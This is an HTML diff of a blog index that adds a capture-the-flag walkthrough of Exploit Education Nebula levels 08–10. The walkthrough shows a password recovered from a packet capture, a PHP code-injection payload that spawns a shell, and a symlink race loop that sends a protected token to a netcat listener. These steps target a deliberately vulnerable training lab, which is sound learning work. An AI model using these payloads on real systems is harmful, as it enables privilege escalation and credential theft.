@@ -30,7 +30,151 @@
         </div>
     </header>
     <div id="wrapper">
-        <div id="content">            <h4 class="date">Sep 06, 2020</h4>
+        <div id="content">            <h4 class="date">Sep 07, 2020</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-3.html" rel="bookmark" title="Permanent Link to &quot;Exploit Education - Nebula Part 3&quot;">Exploit Education - Nebula Part 3</a>
+                </h2>
+
+                
+                
+
+                <h2><a href="https://exploit.education/nebula/level-08/">Level 08</a></h2>
+<h4>Solution</h4>
+<p>This sounds easy enough. Just go to <code>flag08</code> directory and see what kind of files are there.
+At first, I felt intimidated by <code>root:root</code> access to <code>capture.pcap</code> file. However, it occured that the file allows to be read by anyone. In that case, we might be able to copy it and retrieve necessary information.</p>
+<h4>Result</h4>
+<p>After downloading <code>capture.pcap</code> I was able to open it with <code>wireshark</code>, where I've seen some tcp traffic. By selecting <code>Follow TCP</code> I've noticed that this is dump of someone's login attempts.</p>
+<div class="highlight"><pre><span></span><span class="cp">..wwwbugs login: l.le.ev.ve.el.l8.8</span>
+<span class="cp">..</span>
+Password: backdoor...00Rm8.ate
+.
+<span class="cp">..</span>
+Login incorrect
+wwwbugs login:
+</pre></div>
+
+
+<p>However, hex dump shows some more details</p>
+<div class="highlight"><pre><span></span><span class="err">000000B9  62                                                 b</span>
+<span class="err">000000BA  61                                                 a</span>
+<span class="err">000000BB  63                                                 c</span>
+<span class="err">000000BC  6b                                                 k</span>
+<span class="err">000000BD  64                                                 d</span>
+<span class="err">000000BE  6f                                                 o</span>
+<span class="err">000000BF  6f                                                 o</span>
+<span class="err">000000C0  72                                                 r</span>
+<span class="err">000000C1  7f                                                 .</span>
+<span class="err">000000C2  7f                                                 .</span>
+<span class="err">000000C3  7f                                                 .</span>
+<span class="err">000000C4  30                                                 0</span>
+<span class="err">000000C5  30                                                 0</span>
+<span class="err">000000C6  52                                                 R</span>
+<span class="err">000000C7  6d                                                 m</span>
+<span class="err">000000C8  38                                                 8</span>
+<span class="err">000000C9  7f                                                 .</span>
+<span class="err">000000CA  61                                                 a</span>
+<span class="err">000000CB  74                                                 t</span>
+<span class="err">000000CC  65                                                 e</span>
+<span class="err">000000CD  0d                                                 .</span>
+</pre></div>
+
+
+<p>One can notice, that <code>x7f</code> equals to <code>backspace</code>. It probably means, that user pressed wrong key, and removed it.
+After decyphering it, it seems to be <code>backd00Rmate</code>.</p>
+<div class="highlight"><pre><span></span><span class="err">➜  ~ ssh flag08@nebula</span>
+<span class="err">flag08@nebula:~$ ls</span>
+<span class="err">capture.pcap</span>
+<span class="err">flag08@nebula:~$ getflag</span>
+<span class="err">You have successfully executed getflag on a target account</span>
+<span class="err">flag08@nebula:~$</span>
+</pre></div>
+
+
+<h2><a href="https://exploit.education/nebula/level-09/">Level 09</a></h2>
+<p>I couldn't crack this one, so I searched for solution over the internet. This one is explaining it very good: <a href="https://nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-09/">Lucian Nitescu</a>. Unfortunately, my php knowledge is not the best.</p>
+<h4>Solution</h4>
+<p>We need to use both <code>$filename</code> and <code>$use_me</code> variables. First one needs to contain payload, second will contain program name.</p>
+<h4>Result</h4>
+<div class="highlight"><pre><span></span>level09@nebula:~$ cat exploit.php
+<span class="o">[</span>email <span class="o">{</span><span class="si">${</span><span class="nv">system</span><span class="p">(sh)</span><span class="si">}</span><span class="o">}]</span>
+level09@nebula:~$ ~flag09/flag09 exploit.php .
+PHP Notice:  Use of undefined constant sh - assumed <span class="s1">&#39;sh&#39;</span> in /home/flag09/flag09.php<span class="o">(</span><span class="m">15</span><span class="o">)</span> : regexp code on line <span class="m">1</span>
+sh-4.2$ whoami
+flag09
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+sh-4.2$
+</pre></div>
+
+
+<p>Interesting that, when I replaced <code>sh</code> with <code>bash</code> it is not working:</p>
+<div class="highlight"><pre><span></span>PHP Notice:  Use of undefined constant bash - assumed <span class="s1">&#39;bash&#39;</span> in /home/flag09/flag09.php<span class="o">(</span><span class="m">15</span><span class="o">)</span> : regexp code on line <span class="m">1</span>
+bash-4.2$ whoami
+level09
+bash-4.2$ getflag
+getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
+</pre></div>
+
+
+<p>One can always provide <code>$use_me</code> variable too.</p>
+<div class="highlight"><pre><span></span>level09@nebula:~$ cat exploit.php
+<span class="o">[</span>email <span class="o">{</span><span class="si">${</span><span class="nv">system</span><span class="p">(</span><span class="nv">$use_me</span><span class="p">)</span><span class="si">}</span><span class="o">}]</span>
+level09@nebula:~$ ~flag09/flag09 exploit.php getflag
+You have successfully executed getflag on a target account
+PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php<span class="o">(</span><span class="m">15</span><span class="o">)</span> : regexp code on line <span class="m">1</span>
+
+level09@nebula:~$ ~flag09/flag09 exploit.php sh
+sh-4.2$ whoami
+flag09
+</pre></div>
+
+
+<h2><a href="https://exploit.education/nebula/level-10/">Level 10</a></h2>
+<p>TOCTOU == Time of Check, Time of Use</p>
+<p>This is another one, where I spent significant amount of time. Even if I know how it suppose to work, I haven't been able to implement the solution correctly.</p>
+<h4>Solution</h4>
+<p>Time of Check, Time of Use means, that when program is running, it needs to verify an access to file, where we have an access. However, after doing that, we need to swap this file, with another one, which is unavailable to us.</p>
+<h4>Result</h4>
+<p>Nebula instance:</p>
+<div class="highlight"><pre><span></span>level10@nebula:~$ touch my_file
+level10@nebula:~$ <span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> ln -sf /home/flag10/token token<span class="p">;</span> ln -sf my_file token<span class="p">;</span> <span class="k">done</span> <span class="p">&amp;</span>
+<span class="o">[</span><span class="m">1</span><span class="o">]</span> <span class="m">4467</span>
+level10@nebula:~$ <span class="k">while</span> true<span class="p">;</span> <span class="k">do</span> /home/flag10/flag10 token debian<span class="p">;</span> <span class="k">done</span>
+You don<span class="s1">&#39;t have access to token</span>
+<span class="s1">You don&#39;</span>t have access to token
+Connecting to debian:18211 .. Connected!
+Sending file .. wrote file!
+Connecting to debian:18211 .. Unable to connect to host debian
+</pre></div>
+
+
+<p>Second instance</p>
+<div class="highlight"><pre><span></span>dasm@debian:~$ nc -klp <span class="m">18211</span> &gt; received
+dasm@debian:~$ cat received
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+</pre></div>
+
+
+<p>Nebula instance</p>
+<div class="highlight"><pre><span></span>level10@nebula:~$ su flag10
+Password:  <span class="c1"># use found token</span>
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+</pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-3.html">posted at 00:00</a>
+                    &nbsp;&middot;
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags">learning</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/ctf.html" class="tags">ctf</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/exploit.html" class="tags">exploit</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/nebula.html" class="tags">nebula</a>
+                </div>
+            </article>            <h4 class="date">Sep 06, 2020</h4>
 
             <article class="post">
                 <h2 class="title">
